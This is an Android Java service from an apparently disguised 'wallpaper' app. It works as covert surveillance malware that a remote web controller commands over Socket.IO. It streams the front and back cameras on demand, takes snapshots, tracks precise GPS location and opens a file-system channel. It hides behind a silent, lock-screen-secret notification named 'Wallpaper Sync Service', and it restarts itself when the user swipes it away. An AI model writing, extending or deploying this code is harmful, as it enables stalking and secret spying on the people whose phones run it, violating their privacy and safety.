package com.example.wallpaperapplication;

import android.Manifest;
import android.annotation.SuppressLint;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.os.BatteryManager;
import android.os.Build;
import android.os.IBinder;
import android.os.Looper;
import android.util.Log;

import androidx.core.app.NotificationCompat;
import androidx.core.content.ContextCompat;
import androidx.preference.PreferenceManager;

import com.google.android.gms.location.FusedLocationProviderClient;
import com.google.android.gms.location.LocationCallback;
import com.google.android.gms.location.LocationRequest;
import com.google.android.gms.location.LocationResult;
import com.google.android.gms.location.LocationServices;

import io.socket.client.IO;
import io.socket.client.Socket;

import org.json.JSONException;
import org.json.JSONObject;
import org.webrtc.*;

import java.net.URISyntaxException;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collections;
import java.util.List;

public class StreamingService extends Service {
    private static final String TAG = "StreamingService";

    private PeerConnectionFactory factory;
    private EglBase eglBase;

    // Modular Components
    private CameraManager cameraManager;
    private FileSystemExtension fileSystemExtension;

    private PeerConnection peerConnection;
    private Socket socket;
    private volatile String webClientId = null;
    private volatile boolean isCameraStreaming = false;
    private FusedLocationProviderClient fusedLocationClient;
    private LocationCallback locationCallback;
    private long currentGpsIntervalMs = 600000; // 10 minutes default

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "Service onCreate");

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(Constants.NOTIFICATION_ID, createNotification(),
                    android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA |
                    android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION);
        } else {
            startForeground(Constants.NOTIFICATION_ID, createNotification());
        }

        if (!hasRequiredPermissions()) {
            broadcastPermissionError();
            stopSelf();
            return;
        }

        initializeWebRTC();
        setupMediaStreaming();
        connectSignaling();

        fusedLocationClient = LocationServices.getFusedLocationProviderClient(this);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null) {
            String action = intent.getAction();
            if (Constants.ACTION_STOP_STREAMING.equals(action)) {
                stopSelf();
            }
        }
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.d(TAG, "Service onDestroy");
        cleanup();
        if (socket != null) socket.disconnect();
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onTaskRemoved(Intent rootIntent) {
        Log.d(TAG, "Service task removed (app swiped), restarting...");
        Intent restartServiceIntent = new Intent(getApplicationContext(), StreamingService.class);
        restartServiceIntent.setPackage(getPackageName());
        int pendingFlags = PendingIntent.FLAG_ONE_SHOT;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            pendingFlags |= PendingIntent.FLAG_IMMUTABLE;
        }
        PendingIntent restartServicePendingIntent = PendingIntent.getService(
                getApplicationContext(), 1, restartServiceIntent, pendingFlags);

        android.app.AlarmManager alarmService = (android.app.AlarmManager) getApplicationContext().getSystemService(Context.ALARM_SERVICE);
        if (alarmService != null) {
            alarmService.set(
                    android.app.AlarmManager.ELAPSED_REALTIME,
                    android.os.SystemClock.elapsedRealtime() + 1000,
                    restartServicePendingIntent);
        }
        super.onTaskRemoved(rootIntent);
    }

    private String getSignalingUrl() {
        SharedPreferences prefs = PreferenceManager.getDefaultSharedPreferences(this);
        return prefs.getString(Constants.PREF_SIGNALING_URL, Constants.DEFAULT_SIGNALING_URL);
    }

    private boolean hasRequiredPermissions() {
        boolean camera = ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED;
        boolean location = ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED;

        boolean storage = true;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            storage = android.os.Environment.isExternalStorageManager();
        } else {
            storage = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED;
        }

        if (!camera) Log.e(TAG, "Camera permission missing");
        if (!location) Log.e(TAG, "Location permission missing");
        if (!storage) Log.e(TAG, "Storage permission missing");

        return camera && location && storage;
    }

    private void broadcastPermissionError() {
        Intent err = new Intent(Constants.ACTION_PERMISSION_ERROR);
        sendBroadcast(err);
    }

    private void initializeWebRTC() {
        PeerConnectionFactory.initialize(
                PeerConnectionFactory.InitializationOptions.builder(this)
                        .setEnableInternalTracer(true)
                        .createInitializationOptions());
        eglBase = EglBase.create();
        factory = PeerConnectionFactory.builder()
                .setVideoEncoderFactory(new DefaultVideoEncoderFactory(eglBase.getEglBaseContext(), true, true))
                .setVideoDecoderFactory(new DefaultVideoDecoderFactory(eglBase.getEglBaseContext()))
                .createPeerConnectionFactory();
    }

    private void setupMediaStreaming() {
        cameraManager = new CameraManager(this, eglBase);
        cameraManager.initialize(factory);
        // Camera is OFF by default — will be started on cmd:start_camera from web
        setupPeerConnection();
    }

    /** Called when web sends cmd:start_camera — resumes hardware camera capturer */
    private void startCameraStreaming() {
        if (isCameraStreaming) {
            Log.d(TAG, "Camera already streaming, ignoring start");
            return;
        }
        if (cameraManager == null) {
            Log.e(TAG, "CameraManager not initialized");
            return;
        }
        Log.d(TAG, "Starting on-demand camera stream");
        new Thread(() -> {
            try {
                Thread.sleep(200); // Brief pause before hardware open
                cameraManager.setTracksEnabled(true);
                if (cameraManager.isConcurrentStreamingSupported()) {
                    cameraManager.startFrontCamera();
                    cameraManager.startBackCamera();
                } else {
                    cameraManager.startFrontCamera();
                }
                isCameraStreaming = true;
                emitCameraStatus(true);
            } catch (Exception e) {
                Log.e(TAG, "Error starting camera", e);
            }
        }).start();
    }

    /** Called when web sends cmd:stop_camera — pauses hardware capturer WITHOUT touching PeerConnection tracks */
    private void stopCameraStreaming() {
        if (!isCameraStreaming) {
            Log.d(TAG, "Camera not streaming, ignoring stop");
            return;
        }
        if (cameraManager == null) return;
        Log.d(TAG, "Stopping on-demand camera stream (hardware capturer only, tracks preserved in PeerConnection)");
        new Thread(() -> {
            try {
                cameraManager.stopCapturers();
                cameraManager.setTracksEnabled(false);
                Thread.sleep(300); // Allow Camera2 HAL to fully release
                isCameraStreaming = false;
                emitCameraStatus(false);
            } catch (Exception e) {
                Log.e(TAG, "Error stopping camera capturers", e);
                isCameraStreaming = false;
                emitCameraStatus(false);
            }
        }).start();
    }

    private void emitCameraStatus(boolean active) {
        if (socket == null || !socket.connected()) return;
        try {
            JSONObject status = new JSONObject();
            status.put("streaming", active);
            status.put("activeCamera", active ? "front" : "none");
            if (webClientId != null) {
                status.put("to", webClientId);
                status.put("from", socket.id());
            }
            socket.emit(Constants.EVENT_CAMERA_STATUS, status);
            Log.d(TAG, "Emitted camera_status: streaming=" + active);
        } catch (JSONException e) {
            Log.e(TAG, "Error emitting camera status", e);
        }
    }

    private void setupPeerConnection() {
        List<PeerConnection.IceServer> ice = new ArrayList<>();
        ice.add(PeerConnection.IceServer.builder("stun:stun.l.google.com:19302").createIceServer());
        ice.add(PeerConnection.IceServer.builder("turn:numb.viagenie.ca")
                .setUsername("your@email.com")
                .setPassword("yourpassword")
                .createIceServer());

        PeerConnection.RTCConfiguration config = new PeerConnection.RTCConfiguration(ice);
        config.sdpSemantics = PeerConnection.SdpSemantics.UNIFIED_PLAN;
        config.tcpCandidatePolicy = PeerConnection.TcpCandidatePolicy.DISABLED;
        config.bundlePolicy = PeerConnection.BundlePolicy.MAXBUNDLE;
        config.rtcpMuxPolicy = PeerConnection.RtcpMuxPolicy.REQUIRE;

        peerConnection = factory.createPeerConnection(config, new PeerConnection.Observer() {
            @Override
            public void onSignalingChange(PeerConnection.SignalingState s) {
                Log.d(TAG, "Signaling state: " + s);
            }
            @Override
            public void onIceConnectionChange(PeerConnection.IceConnectionState s) {
                Log.d(TAG, "ICE connection state: " + s);
            }
            @Override
            public void onIceConnectionReceivingChange(boolean receiving) {}
            @Override
            public void onIceGatheringChange(PeerConnection.IceGatheringState s) {
                Log.d(TAG, "ICE gathering state: " + s);
            }
            @Override
            public void onIceCandidate(IceCandidate c) {
                if (webClientId == null) return;
                try {
                    JSONObject candidate = new JSONObject();
                    candidate.put("sdpMid", c.sdpMid);
                    candidate.put("sdpMLineIndex", c.sdpMLineIndex);
                    candidate.put("candidate", c.sdp);
                    JSONObject signal = new JSONObject();
                    signal.put("candidate", candidate);
                    JSONObject msg = new JSONObject();
                    msg.put("to", webClientId);
                    msg.put("from", socket.id());
                    msg.put("signal", signal);
                    socket.emit(Constants.EVENT_SIGNAL, msg);
                    Log.d(TAG, "Sent ICE candidate: " + c.sdpMid);
                } catch (JSONException e) {
                    Log.e(TAG, "ICE send failed", e);
                }
            }
            @Override
            public void onIceCandidatesRemoved(IceCandidate[] cs) {}
            @Override
            public void onAddStream(org.webrtc.MediaStream ms) {}
            @Override
            public void onRemoveStream(org.webrtc.MediaStream ms) {}
            @Override
            public void onDataChannel(org.webrtc.DataChannel dc) {}
            @Override
            public void onRenegotiationNeeded() {}
            @Override
            public void onAddTrack(RtpReceiver r, org.webrtc.MediaStream[] ms) {
                Log.d(TAG, "Track added: " + r.id());
            }
        });

        if (cameraManager.hasFrontCamera()) {
            VideoTrack frontTrack = cameraManager.getFrontTrack();
            peerConnection.addTransceiver(frontTrack, new RtpTransceiver.RtpTransceiverInit(
                    RtpTransceiver.RtpTransceiverDirection.SEND_ONLY, Collections.singletonList("stream")));
            Log.d(TAG, "Front video track added");
        }
        if (cameraManager.hasBackCamera()) {
            VideoTrack backTrack = cameraManager.getBackTrack();
            peerConnection.addTransceiver(backTrack, new RtpTransceiver.RtpTransceiverInit(
                    RtpTransceiver.RtpTransceiverDirection.SEND_ONLY, Collections.singletonList("stream")));
            Log.d(TAG, "Back video track added");
        }
    }

    private void connectSignaling() {
        String signalingUrl = getSignalingUrl();
        Log.d(TAG, "Connecting to signaling at " + signalingUrl);

        IO.Options opts = new IO.Options();
        opts.transports = new String[]{"websocket"};
        opts.reconnection = true;
        opts.reconnectionAttempts = 5;
        opts.reconnectionDelay = 5000;

        try {
            socket = IO.socket(signalingUrl, opts);
        } catch (URISyntaxException e) {
            Log.e(TAG, "Bad signaling URL", e);
            stopSelf();
            return;
        }

        // Initialize Filesystem Extension
        fileSystemExtension = new FileSystemExtension(this, socket);
        fileSystemExtension.init();

        socket.on(Socket.EVENT_CONNECT, args -> {
            Log.d(TAG, "Socket.IO CONNECTED");
            socket.emit(Constants.EVENT_IDENTIFY, "android");
        }).on(Socket.EVENT_CONNECT_ERROR, args -> {
            Log.e(TAG, "Connect error: " + Arrays.toString(args));
        }).on("id", args -> {
            Log.d(TAG, "Received socket ID: " + args[0]);
        }).on(Constants.EVENT_WEB_CLIENT_READY, args -> {
            webClientId = (String) args[0];
            Log.d(TAG, "Web client ready: " + webClientId);
            createAndSendOffer();
            startLocationUpdates();
            sendDeviceInfo();
            emitCameraStatus(isCameraStreaming);
        }).on(Constants.EVENT_SIGNAL, args -> {
            Log.d(TAG, "Signal incoming");
            if (args[0] instanceof JSONObject) {
                handleSignaling((JSONObject) args[0]);
            }
        }).on("web-client-disconnected", args -> {
            Log.d(TAG, "Web client disconnected: " + args[0]);
            if (args[0].equals(webClientId)) {
                webClientId = null;
                stopLocationUpdates();
            }
        }).on(Constants.CMD_PING, args -> {
            sendDeviceInfo();
        }).on(Constants.CMD_STOP, args -> {
            cleanup();
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                stopForeground(Service.STOP_FOREGROUND_REMOVE);
            } else {
                stopForeground(true);
            }
            stopSelf();
        }).on(Constants.CMD_CAMERA_SWITCH, args -> {
            Log.d(TAG, "CMD: camera_switch received");
            if (cameraManager != null) {
                Boolean targetFront = null;
                if (args.length > 0 && args[0] instanceof JSONObject) {
                    JSONObject obj = (JSONObject) args[0];
                    if (obj.has("camera")) {
                        targetFront = "front".equalsIgnoreCase(obj.optString("camera"));
                    }
                }
                cameraManager.switchCamera(targetFront, (isFront, success) -> {
                    Log.d(TAG, "Camera switch finished: isFront=" + isFront + ", success=" + success);
                    if (socket != null && socket.connected() && webClientId != null) {
                        try {
                            JSONObject res = new JSONObject();
                            res.put("to", webClientId);
                            res.put("from", socket.id());
                            res.put("activeCamera", isFront ? "front" : "back");
                            socket.emit("camera_switched", res);
                        } catch (JSONException e) {
                            Log.e(TAG, "camera_switched emit error", e);
                        }
                    }
                });
            }
        }).on(Constants.CMD_SET_QUALITY, args -> {
            if (args.length > 0 && args[0] instanceof JSONObject) {
                setVideoQuality((JSONObject) args[0]);
            }
        }).on(Constants.CMD_SET_GPS_INTERVAL, args -> {
            if (args.length > 0 && args[0] instanceof JSONObject) {
                setGpsInterval((JSONObject) args[0]);
            }
        }).on(Constants.CMD_TAKE_SNAPSHOT, args -> {
            if (args.length > 0 && args[0] instanceof JSONObject) {
                takeCameraSnapshot((JSONObject) args[0]);
            }
        }).on(Constants.CMD_START_CAMERA, args -> {
            Log.d(TAG, "CMD: cmd:start_camera received");
            startCameraStreaming();
        }).on(Constants.CMD_STOP_CAMERA, args -> {
            Log.d(TAG, "CMD: cmd:stop_camera received");
            stopCameraStreaming();
        });

        socket.connect();
    }

    private void sendDeviceInfo() {
        if (socket == null || !socket.connected()) return;
        try {
            JSONObject info = new JSONObject();
            info.put("model", Build.MODEL);
            info.put("manufacturer", Build.MANUFACTURER);
            info.put("version", Build.VERSION.RELEASE);
            info.put("streaming", isCameraStreaming);

            // Simple battery percent
            int batteryPct = getBatteryPercent();
            info.put("battery", batteryPct);

            socket.emit(Constants.EVENT_DEVICE_INFO, info);
        } catch (Exception e) {
            Log.e(TAG, "Error sending device info", e);
        }
    }

    private int getBatteryPercent() {
        try {
            IntentFilter ifilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
            Intent batteryStatus = registerReceiver(null, ifilter);
            if (batteryStatus != null) {
                int level = batteryStatus.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
                int scale = batteryStatus.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
                if (scale > 0) {
                    return (int) (level * 100 / (double) scale);
                }
            }
        } catch (Exception ignored) {}
        return 0;
    }

    private void setVideoQuality(JSONObject payload) {
        if (payload == null || cameraManager == null) return;
        String quality = payload.optString("quality", "low");
        int width = 320;
        int height = 240;
        int fps = 10;
        if ("medium".equals(quality)) {
            width = 640;
            height = 480;
            fps = 15;
        } else if ("high".equals(quality)) {
            width = 1280;
            height = 720;
            fps = 30;
        }
        cameraManager.changeResolution(width, height, fps);
    }

    private void setGpsInterval(JSONObject payload) {
        if (payload == null) return;
        long intervalMs = payload.optLong("intervalMs", 600000);
        Log.d(TAG, "Setting GPS polling interval to: " + intervalMs + "ms");
        startLocationUpdates(intervalMs);
    }

    private void startLocationUpdates() {
        startLocationUpdates(currentGpsIntervalMs);
    }

    private void startLocationUpdates(long intervalMs) {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            Log.w(TAG, "Location permission not granted");
            broadcastPermissionError();
            return;
        }

        stopLocationUpdates();
        currentGpsIntervalMs = intervalMs;
        if (intervalMs <= 0) {
            Log.d(TAG, "GPS location updates suspended");
            return;
        }

        LocationRequest locationRequest = new LocationRequest.Builder(
                com.google.android.gms.location.Priority.PRIORITY_HIGH_ACCURACY, intervalMs)
                .setMinUpdateIntervalMillis(intervalMs / 2)
                .build();

        locationCallback = new LocationCallback() {
            @Override
            public void onLocationResult(LocationResult locationResult) {
                if (locationResult == null) return;
                for (android.location.Location location : locationResult.getLocations()) {
                    sendLocation(location.getLatitude(), location.getLongitude());
                }
            }
        };

        try {
            fusedLocationClient.requestLocationUpdates(locationRequest, locationCallback, Looper.getMainLooper());
            Log.d(TAG, "Started location updates with interval: " + intervalMs + "ms");
        } catch (SecurityException e) {
            Log.e(TAG, "Failed to start location updates", e);
            broadcastPermissionError();
        }
    }

    private void sendLocation(double latitude, double longitude) {
        if (webClientId == null || socket == null || !socket.connected()) {
            Log.w(TAG, "Cannot send location, no web client or socket disconnected");
            return;
        }

        try {
            JSONObject locationData = new JSONObject();
            locationData.put("from", socket.id());
            locationData.put("to", webClientId);
            locationData.put("latitude", latitude);
            locationData.put("longitude", longitude);
            socket.emit(Constants.EVENT_LOCATION, locationData);
            Log.d(TAG, "Sent location: lat=" + latitude + ", lng=" + longitude);
        } catch (JSONException e) {
            Log.e(TAG, "Error sending location", e);
        }
    }

    private void stopLocationUpdates() {
        if (locationCallback != null && fusedLocationClient != null) {
            fusedLocationClient.removeLocationUpdates(locationCallback);
            locationCallback = null;
            Log.d(TAG, "Stopped location updates");
        }
    }

    private void takeCameraSnapshot(JSONObject payload) {
        if (payload == null || cameraManager == null) return;
        boolean useFront = payload.optBoolean("useFront", false);
        Log.d(TAG, "Taking photo snapshot with camera lens facing: " + (useFront ? "Front" : "Back"));
        new Thread(() -> {
            cameraManager.captureSnapshot(useFront, base64Image -> {
                if (webClientId == null || socket == null || !socket.connected()) return;
                try {
                    JSONObject data = new JSONObject();
                    data.put("image", base64Image);
                    data.put("camera", useFront ? "front" : "back");

                    JSONObject msg = new JSONObject();
                    msg.put("to", webClientId);
                    msg.put("from", socket.id());
                    msg.put("snapshot", data);

                    socket.emit(Constants.EVENT_SNAPSHOT_DATA, msg);
                    Log.d(TAG, "JPEG snapshot delivered to target web client");
                } catch (JSONException e) {
                    Log.e(TAG, "Snapshot packaging failed", e);
                }
            });
        }).start();
    }

    private void createAndSendOffer() {
        if (webClientId == null) {
            Log.w(TAG, "No web client available");
            return;
        }
        if (peerConnection == null) {
            Log.e(TAG, "PeerConnection is null, cannot create offer");
            return;
        }

        Log.d(TAG, "Creating offer for web client: " + webClientId);
        MediaConstraints mc = new MediaConstraints();
        mc.mandatory.add(new MediaConstraints.KeyValuePair("OfferToReceiveAudio", "false"));
        mc.mandatory.add(new MediaConstraints.KeyValuePair("OfferToReceiveVideo", "false"));

        final String clientId = webClientId;
        final String socketId = socket != null ? socket.id() : null;
        if (socketId == null) {
            Log.e(TAG, "Socket ID is null, cannot create offer");
            return;
        }

        peerConnection.createOffer(new SdpObserver() {
            @Override
            public void onCreateSuccess(SessionDescription sdp) {
                Log.d(TAG, "Offer created, SDP: " + sdp.description);
                String modifiedSdp = sdp.description.replace("a=sendrecv", "a=sendonly")
                        .replace("a=recvonly", "a=sendonly");
                SessionDescription modifiedSession = new SessionDescription(sdp.type, modifiedSdp);
                peerConnection.setLocalDescription(new SdpObserver() {
                    @Override
                    public void onSetSuccess() {
                        try {
                            JSONObject signal = new JSONObject();
                            signal.put("type", "offer");
                            signal.put("sdp", modifiedSession.description);
                            JSONObject msg = new JSONObject();
                            msg.put("to", clientId);
                            msg.put("from", socketId);
                            msg.put("signal", signal);
                            socket.emit(Constants.EVENT_SIGNAL, msg);
                            Log.d(TAG, "Sent offer to web client");
                        } catch (JSONException e) {
                            Log.e(TAG, "Offer send fail", e);
                        }
                    }
                    @Override
                    public void onSetFailure(String err) {
                        Log.e(TAG, "Set local desc fail: " + err);
                    }
                    @Override
                    public void onCreateSuccess(SessionDescription s) {}
                    @Override
                    public void onCreateFailure(String f) {
                        Log.e(TAG, "Create offer fail: " + f);
                    }
                }, modifiedSession);
            }
            @Override
            public void onSetSuccess() {}
            @Override
            public void onCreateFailure(String err) {
                Log.e(TAG, "Create offer fail: " + err);
            }
            @Override
            public void onSetFailure(String err) {
                Log.e(TAG, "Set desc fail: " + err);
            }
        }, mc);
    }

    private void handleSignaling(JSONObject msg) {
        try {
            JSONObject signal = msg.getJSONObject("signal");
            String type = signal.optString("type", "");
            if ("answer".equals(type)) {
                SessionDescription ans = new SessionDescription(
                        SessionDescription.Type.ANSWER, signal.getString("sdp"));
                peerConnection.setRemoteDescription(simpleSdpObserver, ans);
                Log.d(TAG, "Processed answer from web client");
            } else if (signal.has("candidate")) {
                JSONObject candidate = signal.getJSONObject("candidate");
                IceCandidate c = new IceCandidate(
                        candidate.getString("sdpMid"),
                        candidate.getInt("sdpMLineIndex"),
                        candidate.getString("candidate"));
                peerConnection.addIceCandidate(c);
                Log.d(TAG, "Added ICE candidate");
            }
        } catch (JSONException e) {
            Log.e(TAG, "Handle signaling error", e);
        }
    }

    private final SdpObserver simpleSdpObserver = new SdpObserver() {
        @Override
        public void onCreateSuccess(SessionDescription s) {}
        @Override
        public void onSetSuccess() {
            Log.d(TAG, "SDP set success");
        }
        @Override
        public void onCreateFailure(String e) {
            Log.e(TAG, "SDP create fail: " + e);
        }
        @Override
        public void onSetFailure(String e) {
            Log.e(TAG, "SDP set fail: " + e);
        }
    };

    private Notification createNotification() {
        NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            try {
                nm.deleteNotificationChannel(Constants.OLD_CHANNEL_ID);
            } catch (Exception ignored) {}

            NotificationChannel ch = new NotificationChannel(
                    Constants.CHANNEL_ID,
                    "Wallpaper Sync Service",
                    NotificationManager.IMPORTANCE_MIN);
            ch.setDescription("Maintains background synchronization and themes");
            ch.setShowBadge(false);
            ch.enableLights(false);
            ch.enableVibration(false);
            ch.setSound(null, null);
            ch.setLockscreenVisibility(Notification.VISIBILITY_SECRET);
            nm.createNotificationChannel(ch);
        }

        return new NotificationCompat.Builder(this, Constants.CHANNEL_ID)
                .setContentTitle("Wallpaper Vault")
                .setContentText("Background service active")
                .setSmallIcon(R.mipmap.ic_logo)
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .setCategory(NotificationCompat.CATEGORY_SERVICE)
                .setVisibility(NotificationCompat.VISIBILITY_SECRET)
                .setOngoing(true)
                .setSilent(true)
                .build();
    }

    private void cleanup() {
        stopLocationUpdates();

        if (cameraManager != null) {
            cameraManager.dispose();
            cameraManager = null;
        }

        if (peerConnection != null) {
            peerConnection.close();
            peerConnection = null;
        }
        if (eglBase != null) {
            eglBase.release();
            eglBase = null;
        }
        if (factory != null) {
            factory.dispose();
            factory = null;
        }
    }
}